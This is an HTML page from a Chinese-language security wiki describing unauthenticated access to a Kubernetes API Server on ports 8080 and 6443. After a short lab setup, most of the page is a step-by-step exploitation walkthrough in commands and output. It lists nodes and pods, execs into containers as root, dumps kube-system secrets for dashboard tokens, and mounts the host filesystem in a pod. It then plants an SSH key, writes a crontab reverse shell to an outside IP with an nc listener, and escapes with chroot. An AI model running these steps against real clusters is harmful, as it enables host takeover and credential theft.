<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/%E4%BA%91%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/Kubernetes%20API%20Server%20%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
    <link rel="shortcut icon" href="../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Kubernetes API Server 未授权命令执行 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../js/jquery-3.2.1.min.js"></script>
    <script src="../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Kubernetes API Server \u672a\u6388\u6743\u547d\u4ee4\u6267\u884c", url: "#_top", children: [
              {title: "\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1" },
              {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_2" },
              {title: "\u6f0f\u6d1e\u5229\u7528", url: "#_3" },
          ]},
        ];

    </script>
    <script src="../../js/base.js"></script>
      <script src="../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../Kubernetes%20Ingress-nginx%20admission%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2025-1974/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../Kubernetes%20Ingress-nginx%20admission%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2025-1974/" class="btn btn-xs btn-link">
        Kubernetes Ingress-nginx admission 远程代码执行漏洞 CVE-2025-1974
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../Kubernetes%20%2B%20Ubuntu%2018.04%20%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../Kubernetes%20%2B%20Ubuntu%2018.04%20%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" class="btn btn-xs btn-link">
        Kubernetes + Ubuntu 18.04 漏洞环境搭建
      </a>
    </div>
    
  </div>

    

    <h1 id="kubernetes-api-server">Kubernetes API Server 未授权命令执行<a class="headerlink" href="#kubernetes-api-server" title="Permanent link">&para;</a></h1>
<h2 id="_1">漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<p>Kubernetes 是一个可以移植、可扩展的开源平台，使用 声明式的配置 并依据配置信息自动地执行容器化应用程序的管理。在所有的容器编排工具中（类似的还有 docker swarm / mesos 等），Kubernetes 的生态系统更大、增长更快，有更多的支持、服务和工具可供用户选择。</p>
<p>K8s 的 API Server 默认服务端口为 8080(insecure-port) 和 6443(secure-port)，8080 端口提供 HTTP 服务，没有认证授权机制，而 6443 端口提供 HTTPS 服务，支持认证 (使用令牌或客户端证书进行认证) 和授权服务。默认情况下 8080 端口不启动，而 6443 端口启动。这两个端口的开放取决于/etc/kubernetes/manifests/kube-apiserver.yaml 配置文件。</p>
<p>如果目标 K8s 的 8080 端口开启了，由于其没有认证授权机制，因此存在未授权访问。</p>
<p>如果目标 K8s 的 6443 端口开启了，如果配置错误，也可以导致存在未授权访问。</p>
<h2 id="_2">漏洞复现<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<h3 id="8080">8080 端口<a class="headerlink" href="#8080" title="Permanent link">&para;</a></h3>
<p>默认情况下，8080 端口关闭的，手动开启：</p>
<div class="highlight"><pre><span></span><code>cd /etc/kubernetes/manifests
vim kube-apiserver.yaml
</code></pre></div>
<p>高版本的 k8s 中，将 --insecure-port 这个配置删除了，因此添加如下两行：</p>
<div class="highlight"><pre><span></span><code>- --insecure-port=8080
- --insecure-bind-address=0.0.0.0
</code></pre></div>
<p><img alt="image-20230215102911534" src="../images/image-20230215102911534.png" /></p>
<p>重启 k8s：</p>
<div class="highlight"><pre><span></span><code>systemctl restart kubectl
</code></pre></div>
<p>访问 8080 端口即可看到存在未授权：</p>
<p><img alt="image-20230215110103802" src="../images/image-20230215110103802.png" /></p>
<p>也可以使用 kubectl 远程连接获得信息：</p>
<div class="highlight"><pre><span></span><code>kubectl -s http://your-ip:8080 get nodes
</code></pre></div>
<p>注：在高版本（1.20 及其以后）的 K8s 中直接禁用了该端口，并且无法打开。</p>
<h3 id="6443">6443 端口<a class="headerlink" href="#6443" title="Permanent link">&para;</a></h3>
<p>如果运维人员配置不当，将 "system:anonymous" 用户绑定到 "cluster-admin" 用户组，则会使得 6443 端口允许匿名用户以管理员权限访问。</p>
<p>正常情况下访问 6443 端口，提示 Forbidden。</p>
<p><img alt="image-20230215110607076" src="../images/image-20230215110607076.png" /></p>
<p>执行如下命令将 "system:anonymous" 用户绑定到 "cluster-admin" 用户组：</p>
<div class="highlight"><pre><span></span><code>kubectl create clusterrolebinding cluster-system-anonymous --clusterrole=cluster-admin --user=system:anonymous
</code></pre></div>
<p>再次访问访问 6443 端口，即可未授权访问。</p>
<h2 id="_3">漏洞利用<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<h3 id="_4">命令执行<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
<h4 id="k8s">查看 k8s 集群信息<a class="headerlink" href="#k8s" title="Permanent link">&para;</a></h4>
<p>8080 端口</p>
<div class="highlight"><pre><span></span><code>kubectl -s http://your-ip:8080 cluster-info
</code></pre></div>
<p>6443 端口</p>
<div class="highlight"><pre><span></span><code>kubectl --insecure-skip-tls-verify -s https://172.22.14.37:6443/ cluster-info
------
Please enter Username: test
Please enter Password: 
Kubernetes control plane is running at https://172.22.14.37:6443/
KubeDNS is running at https://172.22.14.37:6443//api/v1/namespaces/kube-system/services/kube-dns:dns/proxy
</code></pre></div>
<h4 id="node">查看 node 节点信息<a class="headerlink" href="#node" title="Permanent link">&para;</a></h4>
<p>8080 端口</p>
<div class="highlight"><pre><span></span><code># 查看node节点
kubectl -s http://your-ip:8080 get nodes

# 查看node节点详细信息
kubectl -s http://your-ip:8080 get nodes -o wide
</code></pre></div>
<p>6443 端口</p>
<div class="highlight"><pre><span></span><code># 查看node节点
kubectl --insecure-skip-tls-verify -s https://172.22.14.37:6443/ get nodes   
Please enter Username: 
Please enter Password: 
------
NAME         STATUS   ROLES    AGE    VERSION
ubuntu-k8s   Ready    master   244d   v1.16.6-beta.0

# 查看node节点详细信息
kubectl --insecure-skip-tls-verify -s https://172.22.14.37:6443/ get nodes -o wide
Please enter Username: 
Please enter Password: 
-----
NAME         STATUS   ROLES    AGE    VERSION          INTERNAL-IP    EXTERNAL-IP   OS-IMAGE             KERNEL-VERSION       CONTAINER-RUNTIME
ubuntu-k8s   Ready    master   244d   v1.16.6-beta.0   172.22.14.37   &lt;none&gt;        Ubuntu 18.04.6 LTS   4.15.0-213-generic   docker://24.0.2
</code></pre></div>
<h4 id="pod">查看 pod 节点信息<a class="headerlink" href="#pod" title="Permanent link">&para;</a></h4>
<p>8080 端口</p>
<div class="highlight"><pre><span></span><code># 查看所有的pod
kubectl -s http://your-ip:8080 get pods -A
</code></pre></div>
<p>6443 端口</p>
<div class="highlight"><pre><span></span><code># 查看所有的pod
kubectl --insecure-skip-tls-verify -s https://172.22.14.37:6443/ get pods -A
-----
Please enter Username: 
Please enter Password: 
NAMESPACE     NAME                                 READY   STATUS    RESTARTS   AGE
default       nginx-deployment                     1/1     Running   0          16m
default       nginx-deployment-58d48b746d-d6x8t    1/1     Running   3          240d
...
</code></pre></div>
<h4 id="_5">执行其他命令<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h4>
<p>通过获取到的 pods 节点信息，进入对应 docker 命令执行。-n 对应的是 NAMESPACE，-it 对应的是 NAME。</p>
<h5 id="8080_1">8080 端口<a class="headerlink" href="#8080_1" title="Permanent link">&para;</a></h5>
<div class="highlight"><pre><span></span><code># 进入命名空间为default，名字为hello-minikube的容器
kubectl -s http://your-ip:8080 exec -n default -it hello-minikube -- /bin/bash

# 进入命名空间为kube-system，名字为etcd-ubuntu的容器
kubectl -s http://your-ip:8080 exec -n kube-system -it etcd-ubuntu -- /bin/sh
</code></pre></div>
<h5 id="6443_1">6443 端口<a class="headerlink" href="#6443_1" title="Permanent link">&para;</a></h5>
<div class="highlight"><pre><span></span><code>kubectl --insecure-skip-tls-verify -s https://172.22.14.37:6443/ exec -it nginx-deployment -- /bin/bash
-----
Please enter Username: 
Please enter Password: 
root@nginx-deployment:/# id
uid=0(root) gid=0(root) groups=0(root)
</code></pre></div>
<h3 id="token-dashboard">获取 Token 登录 dashboard<a class="headerlink" href="#token-dashboard" title="Permanent link">&para;</a></h3>
<p>访问如下接口，即可看到 K8s 所有的 Token，过滤找到 dashboard-admin 相关的 Token。</p>
<div class="highlight"><pre><span></span><code>http://your-ip:8080/api/v1/namespaces/kube-system/secrets/

https://your-ip:6443/api/v1/namespaces/kube-system/secrets/
</code></pre></div>
<p>base64 解码，即可使用 base64 解码后的 Token 登录 K8s 的 dashboard。</p>
<h3 id="_6">获取宿主机权限<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h3>
<h4 id="pod_1">创建 pod<a class="headerlink" href="#pod_1" title="Permanent link">&para;</a></h4>
<p>创建名为 nginx-deployment 的 pod，将宿主机的目录挂载到 /mnt 目录下。</p>
<p>新建 test.yaml 文件，内容如下：</p>
<div class="highlight"><pre><span></span><code>apiVersion: v1
kind: Pod
metadata:
  name: nginx-deployment
spec:
  containers:
  - image: nginx:1.8
    name: container
    volumeMounts:
    - mountPath: /mnt
      name: test
  volumes:
  - name: test
    hostPath:
      path: /
</code></pre></div>
<p>创建 pod 并查看运行情况：</p>
<div class="highlight"><pre><span></span><code>kubectl --insecure-skip-tls-verify -s https://your-ip:6443/ apply -f test.yaml
-----
Please enter Username: test
Please enter Password: pod/nginx-deployment created
</code></pre></div>
<div class="highlight"><pre><span></span><code>kubectl --insecure-skip-tls-verify -s https://your-ip:6443/ get pods
-----
Please enter Username: test
Please enter Password: NAME                                READY   STATUS    RESTARTS   AGE
nginx-deployment                    1/1     Running   0          12s
</code></pre></div>
<h4 id="ssh">写入 ssh 公钥<a class="headerlink" href="#ssh" title="Permanent link">&para;</a></h4>
<p>向 <code>/mnt/root/.ssh/authorized_keys</code> 写入公钥，即可获取宿主机 ssh 权限：</p>
<div class="highlight"><pre><span></span><code>kubectl --insecure-skip-tls-verify -s https://your-ip:6443/ exec -it nginx-deployment /bin/bash
-----
root@nginx-deployment:/# echo &quot;&lt;YOUR_ID_RSA.PUB&gt;&quot; &gt; /mnt/root/.ssh/authorized_keys
</code></pre></div>
<h4 id="shell">定时任务反弹 shell<a class="headerlink" href="#shell" title="Permanent link">&para;</a></h4>
<p>写入 crontab 来反弹获取 shell，执行如下命令，将反弹 shell 的命令写入 /var/spool/cron/root 文件中：</p>
<div class="highlight"><pre><span></span><code>echo &quot;*/1  *  *  *  *   /bin/bash -i&gt;&amp;/dev/tcp/172.16.200.58/4444 0&gt;&amp;1&quot; &gt; root
</code></pre></div>
<p>nc 监听接收反弹 shell：</p>
<div class="highlight"><pre><span></span><code>$ nc -lvp 4444
</code></pre></div>
<h4 id="chroot">chroot 逃逸<a class="headerlink" href="#chroot" title="Permanent link">&para;</a></h4>
<div class="highlight"><pre><span></span><code>chroot /mnt
</code></pre></div>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../Kubernetes%20Ingress-nginx%20admission%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2025-1974/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../Kubernetes%20Ingress-nginx%20admission%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2025-1974/" class="btn btn-xs btn-link">
        Kubernetes Ingress-nginx admission 远程代码执行漏洞 CVE-2025-1974
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../Kubernetes%20%2B%20Ubuntu%2018.04%20%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../Kubernetes%20%2B%20Ubuntu%2018.04%20%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" class="btn btn-xs btn-link">
        Kubernetes + Ubuntu 18.04 漏洞环境搭建
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>